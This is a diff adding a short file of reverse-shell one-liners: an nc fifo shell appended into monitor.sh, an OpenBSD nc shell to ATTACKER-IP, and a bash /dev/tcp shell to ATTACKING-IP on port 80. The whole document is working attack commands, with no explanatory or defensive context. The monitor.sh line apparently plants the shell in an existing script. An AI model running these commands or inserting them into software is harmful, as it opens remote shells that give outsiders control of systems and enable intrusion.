@@ -1,0 +1,8 @@
+** nc
+echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <listen_ip> <listen_port> > /tmp/f" >> monitor.sh
+
+** OpenBSD nc
+/usr/bin/mkfifo /tmp/lol;/bin/nc.openbsd ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | /usr/bin/tee /tmp/lol
+
+**BASH
+/bin/bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
